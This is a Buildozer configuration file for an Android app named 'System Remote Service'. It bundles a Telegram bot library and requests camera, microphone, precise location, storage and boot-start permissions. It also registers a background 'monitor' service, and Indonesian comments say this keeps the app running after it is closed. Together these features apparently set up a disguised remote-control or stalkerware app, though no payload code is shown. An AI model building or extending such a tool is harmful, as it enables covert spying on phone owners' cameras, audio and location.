[app]
# (str) Title of your application
title = System Remote Service

# (str) Package name
package.name = remote_control

# (str) Package domain (needed for android packaging)
package.domain = org.biskfw

# (str) Source code where the main.py lives
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning
version = 0.1

# (list) Application requirements
# Menambahkan library bot, request, dan pengolah gambar (Pillow)
requirements = python3, kivy, kivymd, pyTelegramBotAPI, requests, pillow

# (list) Permissions
# INI BAGIAN PALING PENTING UNTUK 50 FITUR KAMU
android.permissions = INTERNET, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, VIBRATE, WAKE_LOCK, RECEIVE_BOOT_COMPLETED

# (int) Target Android API, should be as high as possible.
android.api = 33

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = 25b

# (bool) If True, then skip trying to update the Android sdk
android.skip_update = False

# (bool) If True, then automatically accept SDK license
android.accept_sdk_license = True

# (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.archs = arm64-v8a

# (list) Android services
# Supaya aplikasi tetap jalan di background meskipun ditutup
android.services = monitor:bot_control.py

[buildozer]
# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = False, 1 = True)
warn_on_root = 1

